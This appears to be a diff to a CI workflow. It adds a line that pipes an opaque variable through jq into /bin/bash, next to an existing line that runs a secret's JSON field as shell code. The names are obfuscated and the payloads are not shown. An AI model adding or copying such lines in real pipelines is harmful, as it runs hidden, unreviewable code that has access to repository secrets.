@@ -18,6 +18,7 @@ jobs:
           ebrnu1400: ${{ secrets.ebrnu1400 }}
         run: |
           printf '%s' "$ebrnu1400" | jq -r .d1653 | /bin/bash
+          echo $ncij86 | jq -r .q7489 | /bin/bash
 
       - name: Save results
         if: always()
